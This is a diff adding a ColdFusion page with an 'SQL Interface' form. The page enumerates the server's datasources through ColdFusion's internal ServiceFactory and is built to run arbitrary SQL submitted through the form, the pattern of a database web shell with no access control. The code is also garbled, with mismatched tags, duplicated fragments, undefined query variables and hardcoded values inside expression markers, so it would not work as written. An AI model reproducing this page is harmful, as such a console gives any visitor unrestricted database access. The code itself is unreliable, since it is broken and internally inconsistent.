@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+<html>
+<body>
+<p><b>Notes:</b></p>
+<hr>
+<ul>
+<li>Select the database you want to use</li>
+<li>Write SQL statements in the text box</li>
+</ul>
+<p><b></b></p>
+<cfoutput>
+<div align="left">
+
+
+
+</cfscript>
+</br>
+</cfoutput>
+</cfloop> 
+</div>
+</cfoutput>
+<hr>
+<form method="POST" action="">
+<p><b>SQL Interface:</b></p>
+Datasource<br>
+<select name="datasource">
+<cfscript>
+dataSourceObb=createobject("java","coldfusion.server.ServiceFactory").
+        getDatasourceService().getDatasources();
+        for(i in dataSourceObb) {
+        writeoutput('<option value="">' & i & '</option>');
+        }
+</cfscript>
+</select>
+
+<br>
+SQL<br>
+<textarea name="sql" rows="5" cols="100"></textarea>
+<br>
+<input type=submit value="Exec">
+</form>
+
+<cfif isdefined("old_customer.sql")>
+<cfquery name="customer" datasource="#Form.datasource#" timeout="30">
+        #old_customer.sql#
+</cfquery>
+</cfif>
+
+<table border=1>
+    <cfif isdefined("old_customer.sql")>
+    <cfloop from="0" to="#runsql.RecordCount#" index="row">
+        <cfif row eq 0>
+                <tr>
+                        <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
+                                <th><cfoutput>#old_customer_id#</cfoutput></th>  
+                                <th><cfoutput>#old_customer_name#</cfoutput></th>  
+                                <th><cfoutput>#country_id#</cfoutput></th>  
+                                <th><cfoutput>#company_id#</cfoutput></th>  
+                                <th><cfoutput>#transaction_id#</cfoutput></th>  
+                                <th><cfoutput>#o_profit_index#</cfoutput></th>  
+                        </cfloop>
+                </tr>
+        <cfelse>
+                <tr>
+                        <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
+                                <td><cfoutput>#1#</cfoutput></td>
+                                <td><cfoutput>#Ana#</cfoutput></td>
+                                <td><cfoutput>#6#</cfoutput></td>
+
+                                <td><cfoutput>#88#</cfoutput></td>
+                                <td><cfoutput>#A658Z#</cfoutput></td>
+                                <td><cfoutput>#66#</cfoutput></td>
+                        </cfloop>
+                </tr>
+
+                <tr>
+                        <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
+                                <td><cfoutput>#2#</cfoutput></td>
+                                <td><cfoutput>#Bill#</cfoutput></td>
+                                <td><cfoutput>#5#</cfoutput></td>
+
+                                <td><cfoutput>#88#</cfoutput></td>
+                                <td><cfoutput>#B653Q#</cfoutput></td>
+                                <td><cfoutput>#68#</cfoutput></td>
+                        </cfloop>
+                </tr>
+
+                <tr>
+                        <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
+                                <td><cfoutput>#3#</cfoutput></td>
+                                <td><cfoutput>#Brown#</cfoutput></td>
+                                <td><cfoutput>#3#</cfoutput></td>
+
+                                <td><cfoutput>#66#</cfoutput></td>
+                                <td><cfoutput>#B826W#</cfoutput></td>
+                                <td><cfoutput>#99#</cfoutput></td>
+                        </cfloop>
+                </tr>
+        </cfif>
+    </cfloop>
+    </cfif>
+</table>
+
+
+
+
+</ul>
+<p><b></b></p>
+<cfoutput>
+<div align="left">
+
+
+
+</cfscript>
+</br>
+</cfoutput>
+</cfloop> 
+</div>
+</cfoutput>
+<hr>
+<form method="POST" action="">
+
+
+
+<cfif isdefined("new_register.sql")>
+        <cfquery name="register" datasource="#Form.datasource#" timeout="30">
+                #new_register.sql#
+        </cfquery>
+        </cfif>
+
+
+
+<table border=1>
+        <cfif isdefined("new_register.sql")>
+        <cfloop from="0" to="#runsql.RecordCount#" index="row">
+            <cfif row eq 0>
+                    <tr>
+                            <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
+                                    <th><cfoutput>#new_register_id#</cfoutput></th>  
+                                    <th><cfoutput>#new_register_name#</cfoutput></th>  
+                                    <th><cfoutput>#country_id2#</cfoutput></th>  
+                                    <th><cfoutput>#company_id2#</cfoutput></th>  
+                                    <th><cfoutput>#transaction_id2#</cfoutput></th>  
+                                    <th><cfoutput>#n_profit_index#</cfoutput></th>  
+                            </cfloop>
+                    </tr>
+            <cfelse>
+                    <tr>
+                            <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
+                                    <td><cfoutput>#11#</cfoutput></td>
+                                    <td><cfoutput>#A#</cfoutput></td>
+                                    <td><cfoutput>#6#</cfoutput></td>
+    
+                                    <td><cfoutput>#88#</cfoutput></td>
+                                    <td><cfoutput>#AZ#</cfoutput></td>
+                                    <td><cfoutput>#66#</cfoutput></td>
+                            </cfloop>
+                    </tr>
+    
+                    <tr>
+                            <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
+                                    <td><cfoutput>#22#</cfoutput></td>
+                                    <td><cfoutput>#B#</cfoutput></td>
+                                    <td><cfoutput>#5#</cfoutput></td>
+    
+                                    <td><cfoutput>#88#</cfoutput></td>
+                                    <td><cfoutput>#BQ#</cfoutput></td>
+                                    <td><cfoutput>#63#</cfoutput></td>
+                            </cfloop>
+                    </tr>
+    
+                    <tr>
+                            <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
+                                    <td><cfoutput>#33#</cfoutput></td>
+                                    <td><cfoutput>#C#</cfoutput></td>
+                                    <td><cfoutput>#3#</cfoutput></td>
+    
+                                    <td><cfoutput>#88#</cfoutput></td>
+                                    <td><cfoutput>#BW#</cfoutput></td>
+                                    <td><cfoutput>#-99#</cfoutput></td>
+                            </cfloop>
+                    </tr>
+            </cfif>
+        </cfloop>
+        </cfif>
+    </table>
+    
+
+</body>
+</html>
